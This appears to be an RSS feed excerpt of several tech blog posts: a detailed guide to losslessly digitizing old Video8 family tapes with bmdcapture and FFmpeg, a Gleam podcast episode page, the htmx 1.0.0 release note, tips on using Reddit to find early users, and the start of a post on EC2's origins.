<p>My personal experience with photography began around age 7 shooting on <a href="https://en.wikipedia.org/wiki/110_film" rel="noopener noreferrer" target="_blank">110 film</a> using a small “spy” camera I got as a gift. My dad’s <a href="https://www.sony.com/electronics/support/product/ccd-v5" rel="noopener noreferrer" target="_blank">Sony CCD-V5</a> was bulky, heavy, and probably expensive when he bought it around 1987, so he was reluctant to let me or my sister operate it under his supervision, let alone borrow it to make our own films by ourselves. As a consequence, my sister and I kept ourselves entertained by making audio recordings on much cheaper audio cassette hardware and tapes—we produced an episodic “radio show” starring our stuffed animals long before the podcast was invented. Though my sister and I took good care of our audio equipment, Dad stuck to his guns when it came to who got to use the camcorder, but he would sometimes indulge us when we had a full production planned, scripted, and rehearsed. <a href="https://en.wikipedia.org/wiki/8_mm_video_format#Video8" rel="noopener noreferrer" target="_blank">Video8</a> tapes were expensive, too, and for the most part Dad reserved their use for important events like concerts, school graduations, birthdays, and family holidays.</p>
<figure id="attachment_706" aria-describedby="caption-attachment-706"><img data-attachment-id="706" data-permalink="https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/ccd-v5/" data-orig-file="https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?fit=528%2C390&amp;ssl=1" data-orig-size="528,390" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ccd-v5" data-image-description="" data-medium-file="https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?fit=300%2C222&amp;ssl=1" data-large-file="https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?fit=528%2C390&amp;ssl=1" loading="lazy" src="https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?resize=528%2C390&amp;ssl=1" alt="Sony CCD-V5 camcorder" width="528" height="390" srcset="https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?w=528&amp;ssl=1 528w, https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?resize=300%2C222&amp;ssl=1 300w, https://i2.wp.com/blitter.net/assets/uploads/2020/10/ccd-v5.png?resize=210%2C155&amp;ssl=1 210w" sizes="(max-width: 528px) 100vw, 528px" data-recalc-dims="1"><figcaption id="caption-attachment-706">I remember it being a lot bigger.</figcaption></figure>
<p>I went off to college and spent a <em>lot</em> of time lurking the <a href="https://originaltrilogy.com/" rel="noopener noreferrer" target="_blank">originaltrilogy.com forums</a>. It was here that not only did I learn a lot about the making and technical background of the Star Wars films (a topic I could blog about ad nauseum), but I also picked up a lot about video editing, codecs, post-production techniques, and preservation. OT.com was and still is home to a community of video hobbyists and professionals, most of whom share a common love for the <a href="https://starwarsviscomp.wordpress.com/" rel="noopener noreferrer" target="_blank">unreleased “original unaltered” versions</a> of the Star Wars trilogy. As such, many tips were/are shared as to how to produce the best “fan preservations” of Star Wars and other classic films given the materials available, sacrificing the least amount of quality.</p>
<p>I bought my dad a <a href="https://www.sony.com/electronics/support/product/hdr-cx100" rel="noopener noreferrer" target="_blank">Sony HDR-CX100</a> camcorder some years ago to supplement his by that time affinity for digital still cameras—he took it to Vienna and Salzburg soon after and has since transitioned to shooting digital video mostly on his iPhone. But the 8mm tapes chronicling my family’s milestones over the first 25 years of my life continued to sit, undisturbed, in my folks’ cool, dry basement. My dad has recordings on them going as far back as 1988 that I’ve found so far. These recordings are over 30 years old, so the tapes must be at least that age. </p>
<p>8mm video tape <a href="https://fstoppers.com/diy/unlocking-memories-8mm-tapes-324466" rel="noopener noreferrer" target="_blank">does not last forever</a>, but making analog copies of video tape incurs generational loss each time a copy is dubbed. On the other hand, a digital file can be copied as many times as one wants without any quality loss. All I need is the right capture hardware, appropriate capture software, enough digital storage, and a way to play back the source tapes, and I can preserve one lossless digital capture of each tape indefinitely. The last 8mm camcorder my dad bought—a <a href="https://www.sony.com/electronics/support/product/ccd-tr917" rel="noopener noreferrer" target="_blank">Sony CCD-TR917</a>—still has clean, working heads and can route playback of our existing library of tapes through its S-video and stereo RCA outputs. This provides me with the best possible quality given how they were originally shot.</p>
<hr>
<p>Generally with modern analog-to-digital preservation, you want to losslessly capture the raw source at a reasonably high sample rate with as little processing done to the source material as possible, from the moment it hits the playback heads to the instant it’s written to disk. Any cleanup can be done in post-production software; in fact, as digital restoration technology improves, it is ideal to have a raw, lossless original available to revisit with improved techniques. For this project, I am using my dad’s aforementioned <a href="https://www.sony.com/electronics/support/product/ccd-tr917" rel="noopener noreferrer" target="_blank">Sony CCD-TR917</a> camcorder attached directly to the S-video and stereo audio inputs of a <a href="https://web.archive.org/web/20150128124027/https://www.blackmagicdesign.com/products/intensity/models" rel="noopener noreferrer" target="_blank">Blackmagic Intensity Pro</a> PCIe card. The capturing PC is running Debian Linux and is plugged into the same circuit as the camcorder to avoid possible ground loop noise.</p>
<p>Since my Debian box is headless, I’m not interested in bringing up a full X installation just to grab some videos. Therefore I use the open source, command-line based <a href="https://github.com/lu-zero/bmdtools" rel="noopener noreferrer" target="_blank">bmdtools</a> suite—specifically bmdcapture—to do the raw captures from my Intensity Pro card. I do have to pull down the <a href="https://www.blackmagicdesign.com/developer/product/capture-and-playback" rel="noopener noreferrer" target="_blank">DeckLink SDK</a> in order to build bmdcapture, which does have some minor X-related dependencies, but I have to pull down the DeckLink software anyway for Linux drivers. I invoke the following from a shell before starting playback on the camcorder:</p>
<p><code>$ ./bmdcapture -C 0 -m 0 -M 4 -A 1 -V 6 -d 0 -n 230000 -f &lt;output&gt;.nut</code></p>
<p>The options passed to bmdcapture configure the capture as follows:</p>
<ul>
<li><code>-C 0</code>: Use the one Intensity Pro card I have installed (ID 0)</li>
<li><code>-m 0</code>: Capture using mode 0; that is, 525i59.94 NTSC, or 720×486 pixels at 29.97 FPS</li>
<li><code>-M 4</code>: Set a queue size of up to 4GB. Without this, bmdcapture can run out of memory before the entire tape is captured to disk.</li>
<li><code>-A 1</code>: Use the “Analog (RCA or XLR)” audio input. In my case, stereo RCA.</li>
<li><code>-V 6</code>: Use the “S-Video” video input. The S-video input on the Intensity Pro is provided as <a href="https://web.archive.org/web/20150122212738im_/https://images.blackmagicdesign.com/media/products/intensity/models/connections-intensitypro.png" rel="noopener noreferrer" target="_blank">an RCA pair</a> for chroma (“B-Y In”) and luma/sync (“Y In”); <a href="https://www.amazon.com/dp/B07K768YD1/" rel="noopener noreferrer" target="_blank">an adapter cable</a> is necessary to convert to the standard miniDIN-4 connector.</li>
<li><code>-d 0</code>: Fill in dropped frames with a black frame. The Sony CCD-TR917 has a built-in <a href="https://en.wikipedia.org/wiki/Time_base_correction" rel="noopener noreferrer" target="_blank">TBC</a> (which I leave enabled since I don’t own a separate TBC), but owing to the age of the tapes, there is an occasional frame drop.</li>
<li><code>-n 230000</code>: Capture 230000 frames. At 29.97 FPS, that’s almost 7675 seconds, which is a little over two hours. Should be enough even for full tapes.</li>
<li><code>-f &lt;output&gt;.nut</code>: Write to <code>&lt;output&gt;.nut</code> in the <a href="https://wiki.multimedia.cx/index.php/NUT" rel="noopener noreferrer" target="_blank">NUT container format</a> by default, substituting the tape’s label for <code>&lt;output&gt;</code>. The <a href="https://github.com/lu-zero/bmdtools/blob/master/README.md" rel="noopener noreferrer" target="_blank">README.md provided with bmdtools</a> suggests sticking with the default, and since FFmpeg has no trouble converting from NUT and I’ve had no trouble capturing to that format, I leave the output file format alone.</li>
</ul>
<p>Once I have my lossless capture, I compress the .nut file using bzip2, getting the file size down to up to a quarter of the original size depending on how much of the tape is filled. I then create parity data on the .bz2 archive <a href="https://en.wikipedia.org/wiki/Parchive" rel="noopener noreferrer" target="_blank">using the par2 utility</a>, and put my compressed capture and parity files somewhere safe for long-term archival storage. 🙂</p>
<p>My Windows-based Intel NUC is where I do most of my video post-production work. It lacks a PCIe slot, so I can’t capture there, but that’s fine because at this point my workflow is purely digital and I only have to worry about moving files around. My tools of choice here are AviSynth 2.6 and VirtualDub 1.10.4, but since AviSynth/VirtualDub are designed to work with AVI containers, I first convert my capture from the NUT container to the AVI container using FFmpeg:</p>
<p><code>$ ffmpeg.exe -i &lt;output&gt;.nut -vcodec copy -acodec copy &lt;output&gt;.avi</code></p>
<p>The options passed to FFmpeg are order-dependent and direct it to do the following:</p>
<ul>
<li><code>-i &lt;output&gt;.nut</code>: Use <code>&lt;output&gt;.nut</code> as the input file. FFmpeg is smart and will auto-detect its file format when opened.</li>
<li><code>-vcodec copy</code>: Copy the video stream from the input file’s container to the output file’s container; do not re-encode.</li>
<li><code>-acodec copy</code>: Likewise for the audio stream, copy from the input file’s container to the output file; do not re-encode.</li>
<li><code>&lt;output&gt;.avi</code>: Write to <code>&lt;output&gt;.avi</code>, again substituting my tape’s label for <code>&lt;output&gt;</code> in both the input and output filenames.</li>
</ul>
<div id=""><div>
<h2>A note about video containers vs. video formats</h2>
<p>Pop quiz! Given a file with the .mov extension, do you know for sure whether it will play in your media player?</p>
<p>Files ending with .mov, .avi, .mkv, and even the .nut format mentioned above are “container” files. When you save a digital video as a QuickTime .mov file, the .mov file is just a wrapper around your media, which must be encoded using one or more “codecs.” Codecs are small programs that can en<strong>co</strong>de and/or <strong>dec</strong>ode audio or video. These codecs must be specified at the same time as when you save your movie. QuickTime files can wrap among a great many codecs: Motion JPEG, MPEG, H.264, and Cinepak just to name a few. They’re a bit like Zip files, except that instead of files inside you have audio and/or video tracks, and there’s no compression other than what’s already done by the tracks’ codecs. Though Apple provides support in QuickTime for a number of modern codecs, older formats have been dropped over time and so any particular .mov file may or may not play… even using Apple’s own QuickTime software! Asking for a “QuickTime movie” is terribly vague—a QuickTime .mov file may not play properly on a given piece of hardware if support for a containing <em>codec</em> is missing.</p>
<p>AVI, MKV, and MP4 are containers, too—MP4 is in fact based on Apple’s own QuickTime format. But these are still just <em>containers</em>, and a movie file is nothing without some media inside that can be decoded. Put another way, when I buy a book I’m often offered the option of PDF, hardcover, or paperback form. But if the words contained therein are in Klingon, I still won’t be able to read it. When asked to provide a movie in QuickTime or AVI “format,” get the specifics—what codecs should be inside?</p></div></div>
<p>Now that I have an AVI source file, I can open it in VirtualDub. Owing to its namesake, VirtualDub’s interface is reminiscent of a dual cassette deck ready to “dub” from one container to another. It isn’t as user-friendly as, say, Premiere or Resolve when it comes to editing and compositing, but what it lacks in usability it gains in flexibility. In particular, VirtualDub is designed to run a designated range of source video through one or more “filters,” encoding to one of several output codecs available at …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/">https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/</a></em></p>]]>
            </description>
            <link>https://blitter.net/blog/2020/11/24/digitizing-old-8mm-tapes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198435</guid>
            <pubDate>Tue, 24 Nov 2020 13:59:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gleam and Static Types with Louis Pilfold]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198388">thread link</a>) | @crowdhailer
<br/>
November 24, 2020 | https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold/ | <a href="https://web.archive.org/web/*/https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="fl-main-content" itemprop="mainContentOfPage" role="main">

		
<div>
	<div>

		
		<div>
			<article id="fl-post-6124" itemscope="" itemtype="https://schema.org/BlogPosting">

	
	<header role="banner">
		
		<meta itemscope="" itemprop="mainEntityOfPage" itemtype="https://schema.org/WebPage" itemid="https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold/" content="#023 Gleam and Static Types with Louis Pilfold"><meta itemprop="datePublished" content="2020-11-24"><meta itemprop="dateModified" content="2020-11-24"><div itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"><meta itemprop="name" content="Thinking Elixir"></div>	</header><!-- .fl-post-header -->

	
	
	<div itemprop="text">
		<p>
We talk with Louis Pilfold about how he created Gleam, a static typed language that runs on the BEAM. Louis explains some of the challenges with bringing static types to the BEAM and shares ideas on what can possibly be done about it. We learn how Gleam got started, how it works, and how Elixir and Erlang can interop with it. We cover the recently released Gleam OTP work, talk about Type Driven Development and much more!
</p>

<p>
  Show Notes online – <a href="https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold">https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold</a><br>
  
</p>
<p><strong>Elixir Community News</strong></p>

<ul>
<li><a href="http://devonestes.com/announcing_muzak" target="_blank" rel="noopener noreferrer">http://devonestes.com/announcing_muzak</a> – Devon Estes’ Muzak mutation testing library</li>
<li><a href="https://blog.appsignal.com/2020/11/17/announcing-appsignal-for-elixir-integration-2-0.html" target="_blank" rel="noopener noreferrer">https://blog.appsignal.com/2020/11/17/announcing-appsignal-for-elixir-integration-2-0.html</a> – AppSignal released 2.0 of their reporting tool</li>
<li><a href="https://github.com/phoenixframework/phoenix_live_view/pull/1223" target="_blank" rel="noopener noreferrer">https://github.com/phoenixframework/phoenix_live_view/pull/1223</a> – Phoenix LiveView file upload fix for components</li>
<li><a href="https://github.com/rrrene/credo" target="_blank" rel="noopener noreferrer">https://github.com/rrrene/credo</a> – Happy 5th birthday Credo!</li>
<li><a href="https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/" target="_blank" rel="noopener noreferrer">https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/</a> – New Elixir case-study looks at the collaborative wiki product Slab</li>
<li><a href="https://github.com/teamon/tesla/releases/tag/v1.4.0" target="_blank" rel="noopener noreferrer">https://github.com/teamon/tesla/releases/tag/v1.4.0</a> – Tesla v1.4.0 released – an Elixir HTTP client</li>
<li><a href="https://elixirforum.com/t/introducing-elixirls-the-elixir-language-server/5857/119" target="_blank" rel="noopener noreferrer">https://elixirforum.com/t/introducing-elixirls-the-elixir-language-server/5857/119</a> – ElixirLS version 0.6.2 released.</li>
<li><a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir" target="_blank" rel="noopener noreferrer">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a> – Jose Valim wrote a blog post addressing the idea of people saying “you don’t need Redis when you use Elixir”.</li>
<li><a href="https://baremessages.org/" target="_blank" rel="noopener noreferrer">https://baremessages.org/</a> – A new “binary serialization library” called “bare”. Aims to make Erlang data structures serialize easier in <em>other</em> languages</li>
<li><a href="https://sr.ht/~hauleth/BARE-Erlang/" target="_blank" rel="noopener noreferrer">https://sr.ht/~hauleth/BARE-Erlang/</a></li>
</ul>
<p>Do you know some Elixir news we don’t? Tell us at <a href="https://twitter.com/ThinkingElixir">@ThinkingElixir</a></p>
<p><strong>Discussion Resources</strong></p>

<ul>
<li><a href="https://github.com/gleam-lang/gleam" target="_blank" rel="noopener noreferrer">https://github.com/gleam-lang/gleam</a></li>
<li><a href="https://gleam.run/" target="_blank" rel="noopener noreferrer">https://gleam.run/</a></li>
<li><a href="https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/" target="_blank" rel="noopener noreferrer">https://gleam.run/news/gleam-v0.12-and-gleam-otp-v0.1-released/</a></li>
<li><a href="https://thinkingelixir.com/podcast-episodes/016-gleam-games-and-types-with-quinn-wilton/" target="_blank" rel="noopener noreferrer">https://thinkingelixir.com/podcast-episodes/016-gleam-games-and-types-with-quinn-wilton/</a></li>
<li><a href="https://github.com/gleam-lang/gleam/graphs/contributors" target="_blank" rel="noopener noreferrer">https://github.com/gleam-lang/gleam/graphs/contributors</a></li>
<li><a href="https://www.embark-studios.com/" target="_blank" rel="noopener noreferrer">https://www.embark-studios.com/</a></li>
<li><a href="https://racket-lang.org/" target="_blank" rel="noopener noreferrer">https://racket-lang.org/</a></li>
<li><a href="https://akka.io/" target="_blank" rel="noopener noreferrer">https://akka.io/</a></li>
<li><a href="https://developers.google.com/protocol-buffers/" target="_blank" rel="noopener noreferrer">https://developers.google.com/protocol-buffers/</a></li>
<li><a href="https://github.com/lalrpop/lalrpop" target="_blank" rel="noopener noreferrer">https://github.com/lalrpop/lalrpop</a></li>
<li><a href="http://www.elixir.london/2016/louis-pilfold" target="_blank" rel="noopener noreferrer">http://www.elixir.london/2016/louis-pilfold</a></li>
<li><a href="https://www.youtube.com/watch?v=IONWi9hayEA&amp;index=13&amp;list=PLWbHc_FXPo2ivlIjzcaHS9N_Swe_0hWj0" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=IONWi9hayEA&amp;index=13&amp;list=PLWbHc_FXPo2ivlIjzcaHS9N_Swe_0hWj0</a></li>
<li><a href="https://gleam.run/community/" target="_blank" rel="noopener noreferrer">https://gleam.run/community/</a> – Join the Gleam Discord server</li>
<li><a href="https://twitter.com/louispilfold" target="_blank" rel="noopener noreferrer">https://twitter.com/louispilfold</a> – on Twitter</li>
<li><a href="https://github.com/lpil/" target="_blank" rel="noopener noreferrer">https://github.com/lpil/</a> – on Github</li>
<li><a href="https://lpil.uk/" target="_blank" rel="noopener noreferrer">https://lpil.uk</a> – Blog</li>
</ul>
<p><strong>Find us online</strong></p>
<ul>
<li>Message the show – <a href="https://twitter.com/ThinkingElixir" target="_blank" rel="noopener noreferrer">@ThinkingElixir</a></li>
<li>Mark Ericksen – <a href="https://twitter.com/brainlid" target="_blank" rel="noopener noreferrer">@brainlid</a></li>
<li>David Bernheisel – <a href="https://twitter.com/bernheisel" target="_blank" rel="noopener noreferrer">@bernheisel</a></li>
<li>Cade Ward – <a href="https://github.com/cadebward" target="_blank" rel="noopener noreferrer">Github</a></li>
</ul>
<div itemscope="" itemtype="http://schema.org/AudioObject"><meta itemprop="name" content="#023 Gleam and Static Types with Louis Pilfold"><meta itemprop="uploadDate" content="2020-11-24T04:15:45-07:00"><meta itemprop="encodingFormat" content="audio/mpeg"><meta itemprop="duration" content="PT48M57S"><meta itemprop="description" content="We talk with Louis Pilfold about how he created Gleam, a static typed language that runs on the BEAM. Louis explains some of the challenges with bringing static types to the BEAM and shares ideas on what can possibly be done about it. We learn how Gleam got started, how it works, and how Elixir and Erlang can interop with it. We cover the recently released Gleam OTP work, talk about Type Driven Development and much more!



Show Notes online - https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold"><meta itemprop="contentUrl" content="https://media.blubrry.com/thinkingelixir/s/thinkingelixir-podcast.s3.amazonaws.com/023-gleam-louis-pilfold.mp3"><meta itemprop="contentSize" content="67.4"><div id="powerpress_player_5041"><!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
<p><audio id="audio-6124-1" preload="none" controls="controls"><source type="audio/mpeg" src="https://media.blubrry.com/thinkingelixir/p/thinkingelixir-podcast.s3.amazonaws.com/023-gleam-louis-pilfold.mp3?_=1"><a href="https://media.blubrry.com/thinkingelixir/p/thinkingelixir-podcast.s3.amazonaws.com/023-gleam-louis-pilfold.mp3">https://media.blubrry.com/thinkingelixir/p/thinkingelixir-podcast.s3.amazonaws.com/023-gleam-louis-pilfold.mp3</a></audio></p></div></div><p>Podcast: <a href="https://media.blubrry.com/thinkingelixir/s/thinkingelixir-podcast.s3.amazonaws.com/023-gleam-louis-pilfold.mp3" title="Download" rel="nofollow" download="023-gleam-louis-pilfold.mp3">Download</a></p>	</div><!-- .fl-post-content -->

	
	<div></div>		
</article>


<!-- .fl-post -->
		</div>

		
	</div>
</div>


	</div></div>]]>
            </description>
            <link>https://thinkingelixir.com/podcast-episodes/023-gleam-and-static-types-with-louis-pilfold/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198388</guid>
            <pubDate>Tue, 24 Nov 2020 13:52:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.0.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25198287">thread link</a>) | @crbelaus
<br/>
November 24, 2020 | https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.0.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.0.0/">1.0.0 release</a> of htmx.</p>
<p>htmx is now mature enough that I can recommend it as a general replacement for intercooler.js
projects.  I <strong>don't</strong> think there is a strong reason to port an existing intercooler project to
htmx.  I have several large intercooler apps and will not be moving them over any time soon. I can, however, recommend using htmx over intercooler for new projects.</p>
<p>htmx is a different sort of javascript library.  It is an HTML &amp; hypertext-oriented reply to the current dominance of javascript-based SPA libraries.  It is a response to Tom MacWright's question:
<a href="https://macwright.com/2020/10/28/if-not-spas.html">"If not SPAs, What?"</a>.</p>
<p>As the <a href="https://htmx.org/">homepage says</a>:</p>
<ul>
<li>Why should only <code>&lt;a&gt;</code> and <code>&lt;form&gt;</code> be able to make HTTP requests?</li>
<li>Why should only <code>click</code> &amp; <code>submit</code> events trigger them?</li>
<li>Why should only GET &amp; POST be available?</li>
<li>Why should you only be able to replace the entire screen?</li>
</ul>
<p>HTML-oriented web development was abandoned not because hypertext was a bad idea, but rather because HTML didn't have sufficient expressive power.  htmx aims to fix that &amp; allows you to implement <a href="https://htmx.org/examples/">many common modern web UI patterns</a> using the original hypertext model of the web.</p>
<h3>History &amp; Thanks</h3>
<p>htmx began life as <a href="https://intercoolerjs.org/">intercooler.js</a> back in <a href="https://github.com/bigskysoftware/intercooler-js/commit/62d3dbdb5c056ee866aba3575e148de649fc3efe">2013</a>.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/commit/e38dea64dd1065003a0e833d7b469d24e6bc2919">april</a> of this year I began work on a jQuery-indepenent &amp; improved version of intercoolerjs, renamed
to htmx.  I chose to rename the library because, in working on intercooler, I had come to appreciate that intercooler &amp; htmx were completing HTML as a hypertext rather than just some funky, idiosyncratic javascript libraries.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/releases/tag/v0.0.1">May</a> htmx reached 0.0.1.  Soon thereafter I had the good fortune of being contacted by <a href="https://twitter.com/ben_pylo">Ben Croker</a>
who was interested in htmx as a base for his new reactive library, <a href="https://putyourlightson.com/plugins/sprig">Sprig</a>.  Ben was willing to be an early adopter of htmx and pushed the library along
much faster than it would have gone otherwise.</p>
<p>I have been very lucky to the have help and feedback from many contributors in <a href="https://github.com/bigskysoftware/htmx/graphs/contributors">Github</a> and on <a href="https://htmx.org/discord">Discord</a>.  I'd like to thank, in particular, <a href="https://github.com/benpate">Ben Pate</a>, <a href="https://github.com/rschroll">Robert Schroll</a> &amp; <a href="https://github.com/jreviews">Alejandro Schmeichler</a> for contributing code as well as new ideas and discussions.</p>
<p>I would like to thank <a href="https://devmode.fm/">Devmode.fm</a> for having me on to <a href="https://devmode.fm/episodes/dynamic-html-with-htmx">talk about htmx</a> and for cleaning up all my "uhhs" and "umms".</p>
<p>Finally, I would like to thank <a href="https://github.com/jsampson">Justin Sampson</a>, who took a lot of time to explain REST &amp; HATEOAS to me and how intercooler (and now htmx) fit into that model for web development.</p>
<h3>Changes</h3>
<ul>
<li>I bumped the version number :)</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2020-11-24-htmx-1.0.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198287</guid>
            <pubDate>Tue, 24 Nov 2020 13:38:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use Reddit to get your first users]]>
            </title>
            <description>
<![CDATA[
Score 197 | Comments 131 (<a href="https://news.ycombinator.com/item?id=25198280">thread link</a>) | @xavier_
<br/>
November 24, 2020 | https://blog.spreadtheworld.net/posts/get-first-users-reddit/ | <a href="https://web.archive.org/web/*/https://blog.spreadtheworld.net/posts/get-first-users-reddit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As an indie hacker, we all struggle to validate our ideas, get our first users, and get some traffic. I played a lot with <a href="https://www.reddit.com/user/xAvi_r">Reddit</a> for the last few months, and I can tell you: it’s a gold mine!</p><p>Reddit is super powerful:&nbsp;there are millions of users on the platform, each subreddit is very segmented by niche, and it’s free to use!</p><p>We sometimes see it as an intimidating platform, but it’s not that hard.</p><p>Here is how I&nbsp;use it:</p><h2 id="validate-your-idea">Validate your idea</h2><p>The first step of your indie hacker journey is to validate your idea. You don’t want to spend weeks building something nobody wants. But it can be hard to find your potential customers to validate your product idea.</p><p>With Reddit, you can do it easily. There are subreddits dedicated to Ideas’ feedback. You can post your idea there and you will get some responses within 24hrs. The feedback can be pretty generic as the people in these subs are mostly entrepreneurs and not your potential customer.</p><p>To validate my product idea I prefer to post directly on the sub I&nbsp;want to target. Let’s say you create a tool for developers then I’d post to /r/webdev. You don’t need to have a working MVP, just make some screenshot (or a video) and ask for feedback. Or, even better show them a landing page with a pre-order button or an email form and wait for their reactions.</p><p><em>(For the idea validation step, don’t be afraid to post on a big subreddit with hundreds of thousands of users, the more people see your idea the stronger your validation will be)</em></p><p>Within 24hrs you’ll know if that idea is worth pushing! If you get positive feedback - or even pre-orders - you can build your MVP. If you’re ignored or trashed, then find another way or get another idea!</p><h2 id="get-your-first-users">Get your first users</h2><p>Once your MVP is ready you need a bunch of beta testers to give you some feedback.
Reddit can also help you with that.</p><p>But this time I’d go with a small subreddit, and a super targeted one. Let’s say you created a no-code tool for startups, I’ll try to get my early adopters from /r/nocode (3.7k members) instead of posting on /r/startups (517k members) for instance. It’s a small subreddit, very niche. Then, once you have the first feedback you can iterate on it and post on some bigger subs.</p><p>The idea of “incremental launches” is to start small, build an audience, get some feedback, and grow step by step. Once the super-targeted subreddit loves your product you can start to post on big subreddit and get some traction.</p><p><em>PS: Small subreddit are super powerful if you choose them wisely. I got more than <a href="https://twitter.com/AngeZanetti/status/1325847913466048516">400 visits</a> in 48hrs from my last post on /r/nocode!</em></p><h2 id="get-some-traffic">Get some traffic</h2><p>Last step of the process: your MVP is ready, you need some traffic. And you want a lot of it!</p><p>The strategy here is to create some content around your product and share it with big subreddits. The secret is to provide as much value as you can. Share your secrets, how you grow your product, share your analytics, how much money you make, what did you learn during your journey, etc… It needs to be valuable and targeted to an audience.</p><p>Post your content to the biggest subreddits like /r/Entrepreneur, /r/Programming, or /r/Marketing and add a link to your product/blog at the end (Check the rules of the sub first, but most of them are ok with it)</p><p>If your content is well-targeted and brings some serious value you can get thousands of visitors in a day! And it’s totally repeatable. As long as you can provide value you’ll get some free traffic!</p><p>Do you want to launch on Reddit? DM me on Twitter, I’ll be happy to help → <a href="https://twitter.com/angezanetti">Twitter</a></p></div></div>]]>
            </description>
            <link>https://blog.spreadtheworld.net/posts/get-first-users-reddit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25198280</guid>
            <pubDate>Tue, 24 Nov 2020 13:36:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EC2 Origin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25198157">thread link</a>) | @ashishsheth
<br/>
November 24, 2020 | http://blog.b3k.us/2009/01/25/ec2-origins.html | <a href="https://web.archive.org/web/*/http://blog.b3k.us/2009/01/25/ec2-origins.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I was trying to avoid writing this post and had succeeded at that goal for almost 2 years. After some recent exchanges, I see the wisest move is the opposite. so, here goes.</p>
<p>In 2003 I was working at Amazon for the best manager I’ve ever had, Chris Pinkham. Chris had hired me the previous year as a network engineer, quickly promoting me to manager for the (ridiculously awesome) team. Chris was always pushing me to change the infrastructure, especially driving better abstraction and uniformity, essential for efficiently scaling. He wanted an all IP network instead of the mess of VLANs Amazon had at the time, so we designed it, built it, and worked with developers so their applications would work with it. He wanted anycast <span>DNS</span>, so we hacked up some routing software and put it out there (great idea at the time, but in hindsight we probably should’ve taken a different approach). Chris asked for something, we figured out how, and did it.</p>
<p>Sorry for the digression, back to what I was saying about 2003: Chris and I wrote a short paper describing a vision for Amazon infrastructure that was completely standardized, completely automated, and relied extensively on web services for things like storage. We drew on the work of a number of other folks internally who had been thinking and writing (and sometimes even coding) in the storage services space, and we combined it with our own thinking and experience in infrastructure. Near the end of it, we mentioned the possibility of selling virtual servers as a service.</p>
<p>We presented the paper to Bezos (he doesn’t do slides), he liked a lot of it, and we went back to work.</p>
<p>A few months later, in early 2004, I was told Jeff was interested in the virtual server as a service idea and asked for a more detailed write up of it. This I did, also incorporating a couple of requests Jeff had, like the idea of a “universe” of virtuals, which I translated into network-speak as a distributed firewall to isolate groups of servers. This first cut at it looked almost nothing like the production EC2 service, and, in my view, every change made by the team who built EC2 was for the better. As just one example, that first paper called for a system manifest from which a server would be built. This is similar to how much systems automation works, but is actually terrible for the sort of dynamism desired for EC2.</p>
